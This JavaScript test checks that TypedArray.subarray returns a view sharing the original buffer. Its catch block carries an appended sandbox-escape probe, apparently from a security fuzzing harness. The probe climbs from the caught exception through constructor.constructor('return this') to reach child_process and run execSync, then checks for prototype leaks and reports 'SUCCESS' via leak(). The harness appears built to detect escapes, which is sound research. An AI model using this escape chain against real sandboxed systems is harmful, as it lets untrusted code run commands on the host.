try {
    testWithTypedArrayConstructors(function (TA) {
        var sample = new TA([
            40,
            41,
            42,
            43
        ]);
        var buffer = sample.buffer;
        var result = sample.subarray(1);
        assert.notSameValue(result, sample, 'returns a new instance');
        assert.sameValue(result.buffer, sample.buffer, 'shared buffer');
        assert.sameValue(sample.buffer, buffer, 'original buffer is preserved');
        sample[1] = 100;
        assert(compareArray(result, [
            100,
            42,
            43
        ]), 'changes on the original sample values affect the new instance');
        result[1] = 111;
        assert(compareArray(sample, [
            40,
            100,
            111,
            43
        ]), 'changes on the new instance values affect the original sample');
    });
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}